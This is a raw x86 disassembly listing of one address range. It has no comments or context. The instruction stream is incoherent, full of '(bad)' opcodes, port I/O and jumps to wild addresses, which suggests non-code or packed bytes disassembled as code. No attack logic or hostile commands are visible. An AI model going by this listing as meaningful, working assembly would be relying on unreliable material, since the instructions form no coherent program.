  40b63d:	in     eax,0xad
  40b63f:	xchg   edi,eax
  40b640:	xor    al,dh
  40b642:	daa    
  40b643:	scas   eax,DWORD PTR es:[edi]
  40b644:	jg     0x40b681
  40b646:	mov    eax,edx
  40b648:	jno    0x40b600
  40b64a:	retf   
  40b64b:	sar    BYTE PTR [edi+edx*1-0x5fc87fce],cl
  40b652:	test   eax,0x758f938a
  40b657:	stos   DWORD PTR es:[edi],eax
  40b658:	(bad)  
  40b659:	xlat   BYTE PTR ds:[ebx]
  40b65a:	mov    ebp,0x538d8e8f
  40b65f:	stos   DWORD PTR es:[edi],eax
  40b660:	pop    esi
  40b661:	(bad)  
  40b662:	lahf   
  40b663:	inc    ebx
  40b664:	aad    0xbd
  40b666:	(bad)  
  40b668:	addr16 sti 
  40b66a:	push   0xf762aecb
  40b66f:	push   esi
  40b670:	cdq    
  40b671:	retf   0x4c2a
  40b674:	mov    dl,0xb9
  40b676:	inc    eax
  40b677:	gs xchg edi,eax
  40b679:	mov    bh,0xd2
  40b67b:	scas   al,BYTE PTR es:[edi]
  40b67c:	cmp    eax,0x36af0d4c
  40b681:	sub    DWORD PTR [ebx-0x6f],edi
  40b684:	push   ecx
  40b685:	gs jmp 0x40b696
  40b688:	jle    0x40b6e0
  40b68a:	push   edx
  40b68b:	fdiv   QWORD PTR [ecx]
  40b68d:	ja     0x40b635
  40b68f:	mov    bl,0xf2
  40b691:	inc    ebp
  40b692:	push   ebp
  40b693:	push   esp
  40b694:	dec    eax
  40b695:	xchg   DWORD PTR [edx],edx
  40b697:	out    0x52,eax
  40b699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b69a:	add    al,0xfb
  40b69c:	mov    DWORD PTR [esp+edx*8+0x547fa744],esp
  40b6a3:	and    DWORD PTR [edx],0xffffffc6
  40b6a6:	add    BYTE PTR [edi+0x5ab785fd],dh
  40b6ac:	add    bl,BYTE PTR [esi+0x564e1157]
  40b6b2:	aam    0x48
  40b6b4:	in     al,0xa3
  40b6b6:	test   BYTE PTR [eax],cl
  40b6b8:	push   ebp
  40b6b9:	(bad)  
  40b6ba:	aaa    
  40b6bb:	mov    ds:0xf2214ca7,eax
  40b6c0:	xor    eax,0xb4a46d42
  40b6c5:	outs   dx,BYTE PTR ds:[esi]
  40b6c6:	lahf   
  40b6c7:	nop
  40b6c8:	jno    0x40b71c
  40b6ca:	inc    esp
  40b6cb:	xlat   BYTE PTR ds:[ebx]
  40b6cc:	dec    edi
  40b6cd:	(bad)  
  40b6ce:	cmp    al,0x78
  40b6d0:	mov    cl,0x77
  40b6d2:	mov    ds:0xb6203006,al
  40b6d7:	dec    ebp
  40b6d8:	push   cs
  40b6d9:	xor    dh,BYTE PTR [esi+0xdbd40f]
  40b6df:	cwde   
  40b6e0:	popf   
  40b6e1:	mov    BYTE PTR [ebx+0x2577c71b],ch
  40b6e7:	mov    dh,0xbd
  40b6e9:	sahf   
  40b6ea:	mov    dl,0x7a
  40b6ec:	retf   
  40b6ed:	mov    ch,0xc4
  40b6ef:	dec    ebp
  40b6f0:	mov    ecx,0x40110ae
  40b6f5:	xor    eax,0xbe38d7c2
  40b6fa:	sbb    ah,bh
  40b6fc:	ds xor ecx,eax
  40b6ff:	aas    
  40b700:	xchg   ebp,eax
  40b701:	aam    0xb0
  40b703:	(bad)  
  40b704:	enter  0x24f7,0x58
  40b708:	sahf   
  40b709:	sbb    DWORD PTR [esi-0x5e],ebx
  40b70c:	mov    al,0x50
  40b70e:	jle    0x40b73f
  40b710:	mov    ebx,0xe4c6bbe5
  40b715:	or     al,0x45
  40b717:	cld    
  40b718:	pop    edx
  40b719:	and    cl,BYTE PTR [edx+0x50939c6d]
  40b71f:	in     al,dx
  40b720:	fsubrp st(2),st
  40b722:	sub    eax,DWORD PTR [edx+ecx*1]
  40b725:	mov    bl,0x67
  40b727:	test   bl,0xde
  40b72a:	mov    eax,ds:0xb5aa719f
  40b72f:	mov    cl,bh
  40b731:	shl    BYTE PTR [ecx],0x4d
  40b734:	jae    0x40b79b
  40b736:	ror    ecx,0x1
  40b739:	sbb    eax,0x82f21f01
  40b73e:	sub    al,0x10
  40b740:	les    ebp,FWORD PTR [esi+0x7d]
  40b743:	inc    ebp
  40b744:	push   edi
  40b745:	cdq    
  40b746:	rcl    eax,1
  40b748:	sub    BYTE PTR [edi+0x7101c584],0xf3
  40b74f:	cmp    dl,BYTE PTR [ecx+ecx*4]
  40b752:	out    0x8b,al
  40b754:	sti    
  40b755:	push   edi
  40b756:	pop    edi
  40b757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b758:	ss out 0x7c,eax
  40b75b:	xor    ch,al
  40b75d:	fisubr DWORD PTR [edx+0x27581597]
  40b763:	jbe    0x40b7d3
  40b765:	int3   
  40b766:	and    al,0x71
  40b768:	ds retf 0x5c80
  40b76c:	mov    esi,esp
  40b76e:	retf   
  40b76f:	xor    ch,al
  40b771:	fiadd  DWORD PTR [esi]
  40b773:	outs   dx,BYTE PTR ds:[esi]
  40b774:	leave  
  40b775:	dec    ecx
  40b776:	aam    0xb7
  40b778:	cmp    bl,BYTE PTR [di+0x73]
  40b77c:	ret    
  40b77d:	shl    BYTE PTR [ecx+0x5c8439a0],cl
  40b783:	sbb    ah,cl
  40b785:	xor    dl,BYTE PTR [ebp+eax*1-0x459b9d63]
  40b78c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b78d:	or     DWORD PTR [edi],0xb0603ca5
  40b793:	dec    edi
  40b794:	xchg   ebx,eax
  40b795:	lods   al,BYTE PTR es:[esi]
  40b797:	push   esi
  40b798:	cs ins DWORD PTR es:[edi],dx
  40b79a:	inc    esp
  40b79b:	xchg   edx,eax
  40b79c:	fucom  st(6)
  40b79e:	loop   0x40b76c
  40b7a0:	cwde   
  40b7a1:	xchg   ebp,eax
  40b7a2:	fsub   DWORD PTR [ebx]
  40b7a4:	adc    al,0x7a
  40b7a6:	outs   dx,BYTE PTR ds:[esi]
  40b7a7:	in     al,dx
  40b7a8:	sbb    BYTE PTR [esi],0x4e
  40b7ab:	inc    esp
  40b7ac:	je     0x40b76a
  40b7ae:	shl    BYTE PTR [ebx+0x1a1b9ebc],0x99
  40b7b5:	sbb    ecx,0x6cabb0fb
  40b7bb:	push   ss
  40b7bc:	ret    
  40b7bd:	addps  xmm3,xmm5
  40b7c0:	sahf   
  40b7c1:	(bad)  
  40b7c2:	sub    al,0x57
  40b7c4:	dec    ebx
  40b7c5:	imul   eax,edi,0xffffffca
  40b7c8:	or     DWORD PTR [edx-0x5d4d4104],ecx
  40b7ce:	adc    al,0x78
  40b7d0:	outs   dx,BYTE PTR ds:[esi]
  40b7d1:	(bad)  
  40b7d2:	loope  0x40b849
  40b7d4:	push   ecx
  40b7d5:	inc    esp
  40b7d6:	jne    0x40b762
  40b7d8:	cmp    dl,BYTE PTR [edx+0x6b]
  40b7db:	add    al,0x57
  40b7dd:	shr    DWORD PTR [eax+0x109fa276],cl
  40b7e3:	out    dx,al
  40b7e4:	add    ch,0x75
  40b7e7:	int    0x47
  40b7e9:	call   0x11e22f7e
  40b7ee:	inc    edx
  40b7ef:	call   0xb5a90e2
  40b7f4:	shl    DWORD PTR [edi],1
  40b7f6:	jp     0x40b83b
  40b7f8:	inc    edi
  40b7f9:	(bad)  
  40b7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7fb:	and    DWORD PTR [ebx+0x5d],eax
  40b7fe:	ficomp DWORD PTR [ebp+0x13]
  40b801:	mov    edi,0xc3496eee
  40b806:	inc    eax
  40b807:	inc    ebx
  40b808:	cmp    al,ah
  40b80a:	add    DWORD PTR [eax],esi
  40b80c:	(bad)  
  40b80d:	and    ebp,DWORD PTR ds:0xbd97a479
  40b813:	xor    edx,DWORD PTR [ebp+eiz*8-0x9d2468b]
  40b81a:	fld    TBYTE PTR [ebp+0x4d]
  40b81d:	jmp    0x90825ca0
  40b822:	xchg   ecx,eax
  40b823:	jo     0x40b8a3
  40b825:	test   al,0xd5
  40b827:	fdiv   DWORD PTR [ebx-0x21]
  40b82a:	scas   eax,DWORD PTR es:[edi]
  40b82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b82c:	sub    al,0x87
  40b82e:	pop    es
  40b82f:	push   eax
  40b830:	rep stos BYTE PTR es:[edi],al
  40b832:	add    DWORD PTR [eax+ebp*1],ebx
  40b835:	push   edi
  40b836:	add    ebx,DWORD PTR [esi+0x67085d6f]
  40b83c:	jno    0x40b7f4
  40b83e:	lds    edi,FWORD PTR es:[edi-0x19]
  40b842:	test   DWORD PTR [eax],esi
  40b844:	jecxz  0x40b875
  40b846:	jecxz  0x40b811
  40b848:	xor    ch,ch
  40b84a:	add    edi,DWORD PTR [edx-0x66c89d26]
  40b850:	bound  ebx,QWORD PTR [ecx]
  40b852:	add    eax,0x99b97f69
  40b857:	jae    0x40b874
  40b859:	push   ss
  40b85a:	mov    edx,DWORD PTR [ebp+0x70]
  40b85d:	fs jno 0x40b7fc
  40b860:	and    eax,0x5e311b3
  40b865:	lds    esp,FWORD PTR [esi+0x172d9fef]
  40b86b:	ficomp WORD PTR [ecx+edi*8-0xf]
  40b870:	sbb    DWORD PTR [eax+edi*2+0x12],esi
  40b874:	in     eax,dx
  40b875:	pusha  
  40b876:	pop    ebx
  40b877:	ins    BYTE PTR es:[edi],dx
  40b878:	jnp    0x40b809
  40b87a:	test   DWORD PTR [esi],0x3b10fe99
  40b880:	xor    al,dl
  40b882:	mov    ebp,0x337343d1
  40b887:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40b889:	cmp    al,0x32
  40b88b:	mov    al,0x52
  40b88d:	in     al,dx
  40b88e:	js     0x40b834
  40b890:	dec    ebp
  40b891:	(bad)  
  40b892:	fsub   QWORD PTR [ebx]
  40b894:	or     esp,DWORD PTR [edx+eiz*1]
  40b897:	je     0x40b85a
  40b899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b89a:	rol    DWORD PTR [edi-0x42d64df6],cl
  40b8a0:	into   
  40b8a1:	fs mov bh,0xf0
  40b8a4:	pushf  
  40b8a5:	dec    ebx
  40b8a6:	push   ss
  40b8a7:	fmul   QWORD PTR [eax+0x35602881]
  40b8ad:	push   eax
  40b8ae:	jp     0x40b830
  40b8b0:	enter  0x7592,0xcf
  40b8b4:	into   
  40b8b5:	ror    DWORD PTR [ebp-0x4111639e],0x14
  40b8bc:	int    0x4e
  40b8be:	jge    0x40b8c0
  40b8c0:	xor    eax,0xa0a58a85
  40b8c5:	ret    0xe456
  40b8c8:	mov    esp,0xb801613
  40b8cd:	icebp  
  40b8ce:	cwde   
  40b8cf:	add    eax,0xbef0e392
  40b8d4:	imul   edx,ebp,0x60
  40b8d7:	bound  ecx,QWORD PTR [ecx]
  40b8d9:	(bad)  
  40b8da:	cld    
  40b8db:	fild   DWORD PTR [esi]
  40b8dd:	fld    DWORD PTR [esi-0x3dc426f4]
  40b8e3:	mov    BYTE PTR [edx],cl
  40b8e5:	imul   ebp,DWORD PTR [edi],0x830b908f
  40b8eb:	sbb    al,0xdd
  40b8ed:	pop    esi
  40b8ee:	mov    esp,0x8b4f551
  40b8f3:	xchg   edi,eax
  40b8f4:	sbb    eax,0x1f96e33c
  40b8f9:	lea    ebx,[edi+0x44db7206]
  40b8ff:	adc    bl,ch
  40b901:	sbb    BYTE PTR [esi+esi*4-0x6b5d906f],dl
  40b908:	adc    DWORD PTR [edi],ebp
  40b90a:	test   BYTE PTR [ecx-0x56],bh
  40b90d:	dec    ecx
  40b90e:	add    ah,BYTE PTR [edx-0x44ce5c9b]
  40b914:	lahf   
  40b915:	pop    ebx
  40b916:	call   0x73d53bb8
  40b91b:	inc    edx
  40b91c:	daa    
  40b91d:	icebp  
  40b91e:	mov    esp,0x93bbd553
  40b923:	mov    al,0x89
  40b925:	mov    dl,0x2d
  40b927:	retf   
  40b928:	loopne 0x40b96b
  40b92a:	es cld 
  40b92c:	push   es
  40b92d:	hlt    
  40b92e:	loopne 0x40b8f1
  40b930:	in     al,dx
  40b931:	sbb    ebx,DWORD PTR [ebx+0x11]
  40b934:	xor    DWORD PTR [ebx+0x57],ebp
  40b937:	ror    BYTE PTR [edi],cl
  40b939:	pop    ds
  40b93a:	stos   DWORD PTR es:[edi],eax
  40b93b:	popa   
  40b93c:	inc    ebp
  40b93d:	and    al,BYTE PTR [edx-0x2cfa753e]
  40b943:	shl    eax,cl
  40b945:	mov    dh,0x93
  40b947:	push   esi
  40b948:	or     bl,ah
  40b94a:	jmp    0x40b945
  40b94c:	aas    
  40b94d:	jp     0x40b946
  40b94f:	(bad)  
  40b950:	pop    ebx
  40b951:	(bad)  
  40b952:	(bad)  
  40b953:	(bad)  
  40b954:	jmp    0x22cc238b
  40b959:	pop    edx
  40b95a:	mov    esp,DWORD PTR [ecx]
  40b95c:	or     al,0xf2
  40b95e:	hlt    
  40b95f:	xor    BYTE PTR [esi],ch
  40b961:	push   0xffffffb3
  40b963:	adc    DWORD PTR [ecx-0x661429c6],eax
  40b969:	cmc    
  40b96a:	mov    edi,DWORD PTR [ecx-0x7767f6a8]
  40b970:	cmc    
  40b971:	push   0x2
  40b973:	jo     0x40b8fa
  40b975:	pop    ss
  40b976:	nop
  40b977:	out    dx,al
  40b978:	cs ss scas al,BYTE PTR es:[edi]
  40b97b:	pusha  
  40b97c:	xor    BYTE PTR [eax+0x45],bh
  40b97f:	xchg   ecx,eax
  40b980:	pop    ecx
  40b981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b982:	sbb    ebp,DWORD PTR [ebx+0x4f]
  40b985:	sbb    ch,BYTE PTR [eax-0x32e53deb]
  40b98b:	mov    ch,0x40
  40b98d:	ror    DWORD PTR [eax-0x35a5e7d2],1
  40b993:	lods   al,BYTE PTR ds:[esi]
  40b994:	add    eax,0x1239f434
  40b999:	pop    ss
  40b99a:	std    
  40b99b:	ret    0x1596
  40b99e:	jno    0x40b963
  40b9a0:	sbb    bh,BYTE PTR [eax+0x33912f68]
  40b9a6:	mov    ah,0xc4
  40b9a8:	jne    0x40b990
  40b9aa:	pop    esp
  40b9ab:	or     DWORD PTR [eax+0x30],0x444ae3f
  40b9b2:	fcom   st(4)
  40b9b4:	ret    
  40b9b5:	jmp    0x40ba02
  40b9b7:	loop   0x40ba03
  40b9b9:	and    ebx,DWORD PTR es:0x4944e14f
  40b9c0:	push   esi
  40b9c1:	js     0x40b9f4
  40b9c3:	xlat   BYTE PTR ds:[ebx]
  40b9c4:	add    BYTE PTR [edi+0x3ab6a1c3],dh
  40b9ca:	dec    edx
  40b9cb:	and    ecx,DWORD PTR [edx-0x58]
  40b9ce:	push   edi
  40b9cf:	test   BYTE PTR [ecx-0xf6bd743],0x97
  40b9d6:	mov    dl,0x9c
  40b9d8:	mov    DWORD PTR [ebx+0x20a4669],eax
  40b9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9df:	fcom   DWORD PTR [edx-0x47bd6203]
  40b9e5:	adc    ecx,edi
  40b9e7:	mov    esi,0xb38ccec6
  40b9ec:	mov    dl,0xad
  40b9ee:	cmp    ebx,esp
  40b9f0:	adc    cl,BYTE PTR [ecx]
  40b9f2:	push   ebp
  40b9f3:	cld    
  40b9f4:	jo     0x40b9c6
  40b9f6:	gs hlt 
  40b9f8:	jp     0x40ba31
  40b9fa:	fld    DWORD PTR [edx+0x6e]
  40b9fd:	stc    
  40b9fe:	arpl   WORD PTR [eax-0xe],ax
  40ba01:	cmp    BYTE PTR [esi-0x43],cl
  40ba04:	or     DWORD PTR [edi+0x4a],ecx
  40ba07:	and    ch,BYTE PTR [ebx]
  40ba09:	div    BYTE PTR [ebp-0xe845dc3]
  40ba0f:	(bad)  
  40ba10:	mov    cl,0x92
  40ba12:	cwde   
  40ba13:	lods   al,BYTE PTR ds:[esi]
  40ba14:	ficom  DWORD PTR [ecx+edx*8+0x4a]
  40ba18:	xlat   BYTE PTR ds:[ebx]
  40ba19:	xchg   BYTE PTR [eax],bh
  40ba1b:	pop    ebx
  40ba1c:	jnp    0x40b9a9
  40ba1e:	pop    edi
  40ba1f:	loopne 0x40ba4e
  40ba21:	mov    edx,0x6530edb
  40ba26:	adc    al,0xb1
  40ba28:	add    DWORD PTR [ebp+0x493cb82d],0x17
  40ba2f:	jge    0x40ba2e
  40ba31:	stos   BYTE PTR es:[edi],al
  40ba32:	aad    0xf2
  40ba34:	sbb    edi,ebx
  40ba36:	out    dx,eax
  40ba37:	fldenv [ebp+0x12]
  40ba3a:	inc    esi
  40ba3b:	inc    edi
  40ba3c:	outs   dx,DWORD PTR ds:[esi]
  40ba3d:	aam    0x4
  40ba3f:	out    0x6d,al
  40ba41:	xchg   esi,eax
  40ba42:	mov    ebp,0x9a9bf97b
  40ba47:	ror    ah,0xbc
  40ba4a:	leave  
  40ba4b:	adc    al,0xf5
  40ba4d:	dec    eax
  40ba4e:	mov    al,0xb9
  40ba50:	push   ebp
  40ba51:	jno    0x40baa2
  40ba53:	add    al,BYTE PTR [edx+ecx*4-0x57604477]
  40ba5a:	fcomp  QWORD PTR [ecx]
  40ba5c:	push   0xab657b5d
  40ba61:	cmp    DWORD PTR [edx-0x4],esi
  40ba64:	test   DWORD PTR [ebp+0x2a47ff8f],edi
  40ba6a:	pop    ebp
  40ba6b:	inc    ebp
  40ba6c:	shl    DWORD PTR [eax+0x77],cl
  40ba6f:	ret    0xc5bc
  40ba72:	aaa    
  40ba73:	mov    bh,0x29
  40ba75:	leave  
  40ba76:	test   eax,0x9b64795f
  40ba7b:	stos   BYTE PTR es:[edi],al
  40ba7c:	popf   
  40ba7d:	adc    eax,0xb433cbec
  40ba82:	inc    ecx
  40ba83:	enter  0x34f2,0xcc
  40ba87:	neg    DWORD PTR [ecx]
  40ba89:	sub    al,0xe2
  40ba8b:	mov    esp,0x488217b7
  40ba90:	enter  0x9066,0x19
  40ba94:	xor    DWORD PTR [ecx],esp
  40ba96:	push   esp
  40ba97:	fistp  DWORD PTR [edi]
  40ba99:	push   ss
  40ba9a:	push   esp
  40ba9b:	push   ebp
  40ba9c:	or     DWORD PTR [ecx+0x24],ebx
  40ba9f:	xchg   edi,eax
  40baa0:	adc    BYTE PTR [edx-0x30],bh
  40baa3:	adc    BYTE PTR [ebp-0x38e64498],ch
  40baa9:	data16 (bad) 
  40baab:	ins    DWORD PTR es:[edi],dx
  40baac:	mov    ebp,0xc2a60f45
  40bab1:	imul   esp,DWORD PTR [edx-0x10c03ab6],0xffffffac
  40bab8:	push   esp
  40bab9:	test   al,0x50
  40babb:	dec    ebp
  40babc:	jl     0x40bb22
  40babe:	sbb    DWORD PTR cs:[ecx],0xb65adba7
  40bac5:	fnstcw WORD PTR [esp+esi*4]
  40bac8:	aam    0xbd
  40baca:	into   
  40bacb:	mov    cl,0x21
  40bacd:	mov    ebp,0x61656aa2
  40bad2:	jns    0x40ba55
  40bad4:	adc    bl,BYTE PTR [ecx]
  40bad6:	out    0xc9,eax
  40bad8:	ss retf 0x1d7c
  40badc:	jle    0x40bb09
  40bade:	cmp    DWORD PTR [esp+edi*1+0x50],esi
  40bae2:	pop    eax
  40bae3:	fisubr WORD PTR [ecx+0x2e]
  40bae6:	dec    edx
  40bae7:	push   edi
  40bae8:	mov    cs,WORD PTR [edi-0x2a2ca284]
  40baee:	xor    esp,ebp
  40baf0:	and    edi,esp
  40baf2:	jl     0x40bb47
  40baf4:	in     al,0xd7
  40baf6:	and    bl,ah
  40baf8:	outs   dx,BYTE PTR ds:[esi]
  40baf9:	loop   0x40bb4f
  40bafb:	cli    
  40bafc:	cmp    DWORD PTR [edx+0x1757f5c3],ebp
  40bb02:	dec    esi
  40bb03:	xchg   ebp,eax
  40bb04:	cld    
  40bb05:	mov    BYTE PTR [esi+0x16c1c057],dl
  40bb0b:	add    DWORD PTR [ebp+0x3242c85f],edi
  40bb11:	out    0x28,al
  40bb13:	jle    0x40bb72
  40bb15:	fst    QWORD PTR ss:[ebp-0xe]
  40bb19:	mov    DWORD PTR [ebx-0x69ff2149],ecx
  40bb1f:	sub    eax,0x61bfba7c
  40bb24:	inc    edx
  40bb25:	push   cs
  40bb26:	adc    ch,BYTE PTR [edi]
  40bb28:	sub    DWORD PTR [edi+0x29],edi
  40bb2b:	xchg   esp,eax
  40bb2c:	loop   0x40bb86
  40bb2e:	pop    es
  40bb2f:	pop    edx
  40bb30:	cmp    al,0x97
  40bb32:	rcr    BYTE PTR [ecx],0xa2
  40bb35:	out    dx,eax
  40bb36:	xor    BYTE PTR [edx-0x5d],bh
  40bb39:	dec    edx
  40bb3a:	fstp   QWORD PTR [ebp+0x3f462a98]
  40bb40:	add    eax,DWORD PTR [edi+0x496f2717]
  40bb46:	(bad)  
  40bb47:	push   ss
  40bb48:	push   es
  40bb49:	lea    ebx,ds:0xe8b991a7
  40bb4f:	xor    al,0x5d
  40bb51:	stc    
  40bb52:	mov    al,0xbd
  40bb54:	adc    dh,BYTE PTR [edi+0x3c]
  40bb57:	add    DWORD PTR [ecx],edx
  40bb59:	inc    edx
  40bb5a:	sub    BYTE PTR [edx+0x61],0xdb
  40bb5e:	mov    eax,DWORD PTR [eax+0x61]
  40bb61:	loope  0x40bb41
  40bb63:	test   DWORD PTR [esi+0x1706b0e9],0xb54b23c8
  40bb6d:	outs   dx,BYTE PTR ds:[esi]
  40bb6e:	jae    0x40bbbb
  40bb70:	mov    ch,0xa9
  40bb72:	pop    ebp
  40bb73:	test   DWORD PTR [ebx],eax
  40bb75:	or     DWORD PTR [edi],edi
  40bb77:	fdiv   DWORD PTR [edx]
  40bb79:	repz out 0xe,eax
  40bb7c:	clc    
  40bb7d:	fidiv  DWORD PTR [ebx+0x10]
  40bb80:	cmp    BYTE PTR [ebp-0x65],bl
  40bb83:	mov    eax,ds:0xfd36ceb7
  40bb88:	ds cli 
  40bb8a:	jmp    0x40bbeb
  40bb8c:	imul   ebp,DWORD PTR [esi-0x37],0xdc87fbf8
  40bb93:	mov    eax,ds:0xa9db1fa0
  40bb98:	xor    al,BYTE PTR [ecx]
  40bb9a:	repz sub DWORD PTR [edi+0x389ea7ba],ebp
  40bba1:	js     0x40bb89
  40bba3:	in     al,dx
  40bba4:	xchg   esi,eax
  40bba5:	inc    esi
  40bba6:	mov    bl,0xfb
  40bba8:	add    eax,0x493ed472
  40bbad:	fiadd  WORD PTR [edx+0x7]
  40bbb0:	push   es
  40bbb1:	xchg   DWORD PTR [edx+ecx*2-0x59bcdada],eax
  40bbb8:	sbb    al,0xc7
  40bbba:	or     BYTE PTR ds:0x96e8c69f,ah
  40bbc0:	push   ebp
  40bbc1:	and    BYTE PTR [eax],dl
  40bbc3:	dec    eax
  40bbc4:	dec    ecx
  40bbc5:	push   eax
  40bbc6:	fisttp DWORD PTR [esi]
  40bbc8:	push   0xffffffec
  40bbca:	cmp    al,0x97
  40bbcc:	sub    dh,BYTE PTR [ecx+0xfc4f841]
  40bbd2:	aad    0xab
  40bbd4:	mov    dl,0xfb
  40bbd6:	mov    ch,0xf1
  40bbd8:	call   0xd799ac86
  40bbdd:	mov    esi,0x69a54429
  40bbe2:	call   0x7f175916
  40bbe7:	push   edx
  40bbe8:	inc    edi
  40bbe9:	sbb    al,0x6a
  40bbeb:	mov    dl,0xd9
  40bbed:	adc    ecx,DWORD PTR [ebx-0x578af74c]
  40bbf3:	dec    ebp
  40bbf4:	out    0xc8,al
  40bbf6:	popa   
  40bbf7:	pop    esp
  40bbf8:	lock ja 0x40bc14
  40bbfb:	cmp    ch,BYTE PTR [esi-0x78744553]
  40bc01:	push   edx
  40bc02:	(bad)  
  40bc03:	xchg   edx,eax
  40bc04:	add    BYTE PTR [edx-0x45],dh
  40bc07:	mov    eax,0xa645f47
  40bc0c:	sbb    BYTE PTR [ecx],bh
  40bc0e:	pop    ebp
  40bc0f:	call   0xd9e533eb
  40bc14:	retf   
  40bc15:	sbb    al,0x1e
  40bc17:	mov    ebx,0x7fcb2131
  40bc1c:	les    eax,FWORD PTR [esi]
  40bc1e:	nop    esp
  40bc21:	inc    esp
  40bc22:	mov    ch,0xcc
  40bc24:	lahf   
  40bc25:	ret    
  40bc26:	aaa    
  40bc27:	dec    eax
  40bc28:	mov    ah,0x33
  40bc2a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40bc2c:	push   eax
  40bc2d:	dec    esi
  40bc2e:	pop    es
  40bc2f:	icebp  
  40bc30:	in     eax,dx
  40bc31:	lock push ebx
  40bc33:	pop    ss
  40bc34:	(bad)
  40bc37:	xlat   BYTE PTR ds:[ebx]
  40bc38:	cmp    al,0x76
  40bc3a:	sbb    edi,DWORD PTR [ebp+0x5dff606e]
  40bc40:	add    al,0x45
  40bc42:	jle    0x40bbf5
  40bc44:	out    0xa4,al
  40bc46:	add    dl,BYTE PTR [edx-0x3131b31e]
  40bc4c:	rcl    BYTE PTR [esi],0x1c
  40bc4f:	arpl   WORD PTR [ecx],cx
  40bc51:	adc    ebp,ebp
  40bc53:	test   DWORD PTR [ebx],0x26420af0
  40bc59:	and    BYTE PTR [edi+0x6d],ah
  40bc5c:	call   0x28f1:0x47394d92
  40bc63:	out    dx,al
  40bc64:	dec    esp
  40bc65:	pop    ebp
  40bc66:	mov    bh,0x7
  40bc68:	mov    dh,0xdd
  40bc6a:	ret    
  40bc6b:	xor    al,0x48
  40bc6d:	sbb    bl,ch
  40bc6f:	mov    ebp,0xc171e9da
  40bc74:	in     al,0x2d
  40bc76:	xor    DWORD PTR [ecx+0x2b],ebx
  40bc79:	dec    edi
  40bc7a:	mov    esp,0x372f27dd
  40bc7f:	cmp    DWORD PTR [ecx-0x78b6b5c0],edx
  40bc85:	sub    BYTE PTR [ecx+0x6b],bh
  40bc88:	mov    cs,WORD PTR [ecx+0x7f]
  40bc8b:	fist   DWORD PTR [ecx+0x41691dd3]
  40bc91:	popa   
  40bc92:	cmp    ch,dh
  40bc94:	sub    DWORD PTR [eax],eax
	...
  40bd12:	add    BYTE PTR [eax],al
  40bd14:	pop    edx
  40bd15:	in     al,0xf9
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	fnstsw WORD PTR [edi-0x2]
  40bd1c:	or     eax,0x864271cc
  40bd21:	int    0x89
  40bd23:	mov    dl,0x8a
  40bd25:	ins    DWORD PTR es:[edi],dx
  40bd26:	add    BYTE PTR [eax],al
  40bd28:	imul   eax,DWORD PTR [edi],0xb62f0000
  40bd2e:	loope  0x40bd11
  40bd30:	popa   
  40bd31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd32:	pop    esi
  40bd33:	xchg   DWORD PTR [esi+0x37c08b1a],esi
  40bd39:	xor    BYTE PTR [edi-0x6f18f565],dl
  40bd3f:	data16 jecxz 0x40bdbc
  40bd42:	icebp  
  40bd43:	mov    BYTE PTR [edx+0x16b96f93],cl
  40bd49:	idiv   edi
  40bd4b:	cmp    ah,BYTE PTR [edi-0x4443f465]
  40bd51:	sbb    esp,esp
  40bd53:	inc    ebp
  40bd54:	cmc    
  40bd55:	push   esp
  40bd56:	mov    ecx,0x6f8533c4
  40bd5b:	outs   dx,DWORD PTR ds:[esi]
  40bd5c:	call   0x51e2ca01
  40bd61:	mov    eax,0xfbb212e7
  40bd66:	enter  0x3227,0xed
  40bd6a:	mov    edx,0x2e54ac38
  40bd6f:	and    al,0x13
  40bd71:	repz jg 0x40bdae
  40bd74:	inc    ebx
  40bd75:	popf   
  40bd76:	xor    ecx,ebp
  40bd78:	popa   
  40bd79:	cmp    BYTE PTR [ecx+0x60],0xd6
  40bd7d:	pop    ebp
  40bd7e:	les    ecx,FWORD PTR [edi+0x3dad1960]
  40bd84:	cs inc eax
  40bd86:	add    al,BYTE PTR [bp-0x24d1]
  40bd8b:	out    0xb2,eax
  40bd8d:	fdiv   QWORD PTR ds:0x938f7072
  40bd93:	ss adc ebx,esp
  40bd96:	mov    ebx,DWORD PTR [ebx-0x2aa5545a]
  40bd9c:	pop    edi
  40bd9d:	jecxz  0x40be1d
  40bd9f:	adc    ch,bh
  40bda1:	fwait
  40bda2:	(bad)  
  40bda3:	mov    ecx,0x9341fb32
  40bda8:	mov    edx,0x9c7bf12e
  40bdad:	push   ebx
  40bdae:	sti    
  40bdaf:	or     eax,0x261f89f9
  40bdb4:	clc    
  40bdb5:	ret    0xdab7
  40bdb8:	lahf   
  40bdb9:	pusha  
  40bdba:	pop    ds
  40bdbb:	pop    ds
  40bdbc:	lahf   
  40bdbd:	adc    ecx,DWORD PTR [eax]
  40bdbf:	and    BYTE PTR [ebx-0x5419b90],dl
  40bdc5:	inc    esi
  40bdc6:	pop    ds
  40bdc7:	sub    al,0xcb
  40bdc9:	mov    esp,0x41c02ae2
  40bdce:	mov    dh,0x59
  40bdd0:	mov    bh,0xd8
  40bdd2:	jnp    0x40bda3
  40bdd4:	xchg   edx,eax
  40bdd5:	push   ds
  40bdd6:	std    
  40bdd7:	jmp    0x40bdba
  40bdd9:	pushf  
  40bdda:	push   eax
  40bddb:	pop    esi
  40bddc:	pop    ecx
  40bddd:	addr16 mov ds:0x82d4,eax
  40bde1:	dec    BYTE PTR [eax+edi*8-0x3e]
  40bde5:	inc    esi
  40bde6:	inc    ecx
  40bde7:	jmp    FWORD PTR gs:[edi]
  40bdea:	pop    es
  40bdeb:	push   ss
  40bdec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bded:	hlt    
  40bdee:	repz loope 0x40be07
  40bdf1:	pop    esi
  40bdf2:	jle    0x40be01
  40bdf4:	outs   dx,DWORD PTR ds:[esi]
  40bdf5:	xor    BYTE PTR [ebp-0x3f43ae92],al
